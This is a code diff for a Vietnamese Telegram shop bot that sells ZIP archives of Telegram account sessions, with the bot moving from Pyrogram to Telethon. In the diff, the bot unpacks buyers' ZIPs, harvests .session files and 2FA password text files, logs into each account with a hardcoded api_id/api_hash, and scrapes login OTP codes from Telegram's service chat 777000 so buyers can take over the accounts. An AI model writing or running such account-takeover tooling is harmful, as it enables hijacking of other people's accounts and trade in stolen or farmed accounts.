@@ -9,7 +9,7 @@ import aiohttp
 from datetime import datetime
 
 # ==========================================
-# FIX LỖI EVENT LOOP CỦA PYROGRAM & RENDER
+# FIX LỖI EVENT LOOP CỦA PYTHON TRÊN RENDER
 # ==========================================
 try:
     asyncio.get_running_loop()
@@ -18,7 +18,10 @@ except RuntimeError:
 
 from fastapi import FastAPI, Request
 import uvicorn
-from pyrogram import Client
+
+# Thay thế Pyrogram bằng Telethon
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
@@ -58,7 +61,6 @@ async def keep_alive_task():
     while True:
         await asyncio.sleep(600)  # Nghỉ 10 phút
         try:
-            # Lấy URL của Render, nếu test local thì gọi localhost
             url = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{config.PORT}")
             async with aiohttp.ClientSession() as session:
                 await session.get(url)
@@ -120,13 +122,13 @@ async def get_main_menu_markup():
 
 async def render_home_text(user_id, full_name, balance):
     return (
-        f"🌟 <b>SHOP TELEGRAM TỰ ĐỘNG</b> 🌟\n"
+        f"🌟 <b>HỆ THỐNG SHOP TELEGRAM TỰ ĐỘNG</b> 🌟\n"
         f"{create_divider()}\n"
         f"👋 Chào mừng: <b>{full_name}</b>\n"
         f"🆔 ID của bạn: <code>{user_id}</code>\n"
         f"💰 Số dư: <b>{balance:,} VNĐ</b>\n"
         f"{create_divider()}\n"
-        f"💡 <i>Mẹo: Sau khi mua hàng, hãy <b>Forward file .zip</b> vào bot để nhận OTP đăng nhập tự động nhé!</i>"
+        f"💡 <i>Mẹo: Sau khi mua hàng, hãy <b>Forward file .zip</b> vào bot để hệ thống tự động giải nén và lấy OTP đăng nhập nhé!</i>"
     )
 
 @dp.message(Command("start"))
@@ -281,13 +283,13 @@ async def process_buy(call: CallbackQuery):
                 f"💸 Thanh toán: <b>{final_price:,} VNĐ</b>\n"
                 f"📥 Dữ liệu của bạn đã sẵn sàng.\n\n"
                 f"⚠️ <b>HƯỚNG DẪN TỰ ĐỘNG LẤY OTP:</b>\n"
-                f"1. Tải file dưới đây về máy.\n"
+                f"1. Tải file ZIP bên dưới về máy.\n"
                 f"2. Chuyển tiếp (Forward) file đó lại vào bot này.\n"
-                f"3. Làm theo hướng dẫn trên màn hình.\n"
+                f"3. Bot sẽ tự động trích xuất OTP và mã 2FA.\n"
                 f"{create_divider()}"
             )
             builder = InlineKeyboardBuilder()
-            builder.row(InlineKeyboardButton(text="📥 Tải File Tài Nguyên", url=file_url))
+            builder.row(InlineKeyboardButton(text="📥 Tải File Tài Khoản (.ZIP)", url=file_url))
             builder.row(InlineKeyboardButton(text="⬅️ Quay lại Trang Chủ", callback_data="menu_main"))
             await call.message.edit_text(text, reply_markup=builder.as_markup())
     else:
@@ -315,14 +317,14 @@ async def show_history(call: CallbackQuery):
     await call.message.edit_text(text, reply_markup=builder.as_markup())
 
 # ==========================================
-# LUỒNG XỬ LÝ FILE ZIP VÀ LẤY OTP TỰ ĐỘNG
+# LUỒNG XỬ LÝ FILE ZIP VÀ LẤY OTP TỰ ĐỘNG (BẢN TELETHON TỐI ƯU)
 # ==========================================
 @dp.message(F.document)
 async def handle_zip_document(message: Message):
     if not message.document.file_name.endswith('.zip'):
         return
         
-    loading_msg = await message.answer("🔄 <i>Đang tiếp nhận và giải nén dữ liệu...</i>")
+    loading_msg = await message.answer("🔄 <i>Đang tiếp nhận và giải nén dữ liệu, lọc rác tdata...</i>")
     
     file_id = message.document.file_id
     file_name = message.document.file_name
@@ -343,16 +345,26 @@ async def handle_zip_document(message: Message):
             zip_ref.extractall(extract_dir)
             
         session_files = []
+        two_fa_code = "Không có"
+        
+        # Quét tìm file session Telethon và file 2FA.txt, bỏ qua các tdata vô dụng
         for root, _, files in os.walk(extract_dir):
             for f in files:
                 if f.endswith('.session'):
                     session_files.append(os.path.join(root, f))
+                # Tự động bắt pass 2FA (Bắt tên file chứa chữ 2fa)
+                elif '2fa' in f.lower() and f.endswith('.txt'):
+                    try:
+                        with open(os.path.join(root, f), 'r', encoding='utf-8') as txt_file:
+                            two_fa_code = txt_file.read().strip()
+                    except:
+                        pass
                     
         session_count = len(session_files)
         
         if session_count == 0:
             shutil.rmtree(temp_dir, ignore_errors=True)
-            return await loading_msg.edit_text("❌ Định dạng không hỗ trợ. Không tìm thấy file .session trong file ZIP.")
+            return await loading_msg.edit_text("❌ Định dạng không hỗ trợ. Không tìm thấy file .session (Telethon SQLite) trong file ZIP này.")
 
         text = (
             f"✅ <b>TẢI LÊN THÀNH CÔNG</b>\n"
@@ -367,6 +379,10 @@ async def handle_zip_document(message: Message):
         safe_session_dir = f"sessions_data/{user_id}"
         os.makedirs(safe_session_dir, exist_ok=True)
         
+        # Lưu pass 2FA chung vào thư mục của user này
+        with open(os.path.join(safe_session_dir, "2fa_saved.txt"), "w", encoding="utf-8") as f:
+            f.write(two_fa_code)
+        
         for index, session_path in enumerate(session_files, start=1):
             phone_number = os.path.basename(session_path).replace('.session', '')
             safe_session_path = os.path.join(safe_session_dir, f"{phone_number}.session")
@@ -380,6 +396,7 @@ async def handle_zip_document(message: Message):
     except Exception as e:
         await loading_msg.edit_text(f"❌ Xử lý file thất bại: {str(e)}")
     finally:
+        # Xóa rác tdata để nhẹ server
         shutil.rmtree(temp_dir, ignore_errors=True)
 
 @dp.callback_query(F.data.startswith("info_sess_"))
@@ -388,11 +405,19 @@ async def session_info_handler(call: CallbackQuery):
     phone_number = call.data.replace("info_sess_", "")
     user_id = call.from_user.id
     
+    two_fa_code = "Không có"
+    safe_session_dir = f"sessions_data/{user_id}"
+    try:
+        with open(os.path.join(safe_session_dir, "2fa_saved.txt"), "r", encoding="utf-8") as f:
+            two_fa_code = f.read().strip()
+    except:
+        pass
+    
     text = (
         f"📱 <b>THÔNG TIN TÀI KHOẢN</b>\n"
         f"{create_divider()}\n"
         f"📞 <b>Phone :</b> <code>{phone_number}</code>\n"
-        f"🔐 <b>2FA :</b> <i>Bỏ qua nếu không có</i>\n"
+        f"🔐 <b>2FA :</b> <code>{two_fa_code}</code>\n"
         f"{create_divider()}\n"
         f"⬇️ Hãy nhập SĐT trên vào app Telegram của bạn, sau đó ấn nút <b>[✅ Check]</b> để lấy mã OTP."
     )
@@ -402,55 +427,60 @@ async def session_info_handler(call: CallbackQuery):
     await call.message.answer(text, reply_markup=builder.as_markup())
 
 # ==========================================
-# FIX LỖI ĐỌC FILE SESSION CỦA PYROGRAM CHUẨN XÁC NHẤT
+# CỖ MÁY QUÉT OTP BẰNG TELETHON (BẢN CHỐNG CRASH)
 # ==========================================
 @dp.callback_query(F.data.startswith("getotp_"))
 async def check_otp_handler(call: CallbackQuery):
     await call.answer("Đang thâm nhập hệ thống Telegram lấy mã...", show_alert=False)
     _, user_id, phone_number = call.data.split("_")
     
-    # Chỉ định thư mục chứa session và tên file để Pyrogram không bị nhầm lẫn
     work_dir = f"sessions_data/{user_id}"
     full_session_path = os.path.join(work_dir, f"{phone_number}.session")
     
     if not os.path.exists(full_session_path):
         return await call.message.answer("❌ Dữ liệu phiên đã hết hạn hoặc bị xóa khỏi máy chủ.")
 
-    # Khởi tạo Pyrogram chuẩn chỉ
-    app_client = Client(
-        name=phone_number, # Tên này phải khớp với tên file (không có đuôi .session)
-        workdir=work_dir,  # Thư mục chứa file
+    # Khởi tạo Telethon. Telethon sẽ tự tìm file phone_number.session trong work_dir
+    client = TelegramClient(
+        session=os.path.join(work_dir, phone_number),
         api_id=2040, 
-        api_hash="b18441a1ff607e10a989891a5462e627", 
-        in_memory=False, 
-        no_updates=True
+        api_hash="b18441a1ff607e10a989891a5462e627"
     )
     
     try:
-        await app_client.connect()
+        await client.connect()
+        
+        # Phân biệt rõ Acc bị ban và Acc đang sống
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return await call.message.answer("❌ Phiên đăng nhập không hợp lệ hoặc đã bị Telegram đăng xuất (Session Die).")
+            
         otp_code = None
         
-        async for msg in app_client.get_chat_history(777000, limit=3):
-            if msg.text:
-                match = re.search(r'\b(\d{5})\b', msg.text)
+        # Quét 3 tin nhắn mới nhất từ Telegram
+        async for msg in client.iter_messages(777000, limit=3):
+            if msg.message:
+                match = re.search(r'\b(\d{5})\b', msg.message)
                 if match:
                     otp_code = match.group(1)
                     break
                     
-        await app_client.disconnect()
+        await client.disconnect()
         
         if otp_code:
             await call.message.answer(f"🎉 <b>THÀNH CÔNG!</b>\nMã đăng nhập Telegram của bạn là: <code>{otp_code}</code>")
         else:
-            await call.message.answer("⚠️ <b>Chưa có mã gửi về!</b>\nHãy chắc chắn bạn đã bấm 'Send Code as SMS' trên ứng dụng của bạn, chờ vài giây và Check lại.")
+            await call.message.answer("⚠️ <b>Chưa có mã gửi về!</b>\nHãy chắc chắn bạn đã bấm 'Send Code as SMS' trên ứng dụng của bạn, chờ 5 giây và Check lại.")
             
+    except PhoneNumberBannedError:
+        await call.message.answer("❌ Tài khoản này đã bị Telegram BAN hoàn toàn (Banned).")
     except Exception as e:
         error_info = str(e)
-        print(f"[PYROGRAM ERROR] {error_info}")
-        if "sqlite3" in error_info or "database is locked" in error_info or "no such table" in error_info:
-            await call.message.answer("❌ Lỗi định dạng Session: File này được tạo bằng Telethon, không tương thích với bộ đọc Pyrogram của Bot.")
-        else:
-            await call.message.answer(f"❌ Phiên đăng nhập đã chết hoặc có lỗi xảy ra:\n<code>{error_info}</code>")
+        print(f"[TELETHON ERROR] {error_info}")
+        await call.message.answer(f"❌ Có lỗi kỹ thuật xảy ra:\n<code>{error_info}</code>")
+    finally:
+        if client.is_connected():
+            await client.disconnect()
 
 # ==========================================
 # NẠP TIỀN & SEPAY WEBHOOK
@@ -679,9 +709,7 @@ async def start_telegram_bot():
 
 @app.on_event("startup")
 async def on_startup():
-    # Chạy Bot ngầm
     asyncio.create_task(start_telegram_bot())
-    # Chạy luồng Ping 24/7
     asyncio.create_task(keep_alive_task())
 
 if __name__ == "__main__":
